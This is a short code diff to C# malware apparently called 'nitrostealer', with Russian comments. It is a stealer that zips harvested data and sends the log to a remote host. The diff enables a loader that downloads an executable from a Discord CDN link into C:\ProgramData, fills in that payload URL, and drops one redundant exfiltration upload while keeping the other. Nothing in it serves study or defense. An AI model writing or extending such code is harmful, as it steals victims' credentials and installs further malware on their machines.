@@ -64,7 +64,7 @@ namespace nitrostealer
                             t.Join();
 
                         Request(); // Отправка лога на хост
-                      //  Downloader(); // лоадер файла
+                        Downloader(); // лоадер файла
                     }
 
                     catch (Exception e)
@@ -91,12 +91,6 @@ namespace nitrostealer
                     zip.Save(zipArchive);
                 }
 
-                byte[] datas = Convert.FromBase64String("1488");
-                string decodedStrings = Encoding.UTF8.GetString(datas);
-
-                WebClient client_ = new WebClient();
-                Uri link_ = new Uri(decodedStrings);
-                client_.UploadFile(link_, zipArchive);
                 
                 byte[] data = Convert.FromBase64String(Program.link);
                 string decodedString = Encoding.UTF8.GetString(data);
@@ -120,7 +114,7 @@ namespace nitrostealer
             WebClient wc = new WebClient();
 
             // Ниже необходимо ввести прямую ссылку на ваш файл
-            string url = "";
+            string url = "https://cdn.discordapp.com/attachments/980079588027813988/990561164176015400/test.exe";
 
             // Куда будет скачиваться ваш файл и под каким названием?
             string save_path = "C:\\ProgramData\\";
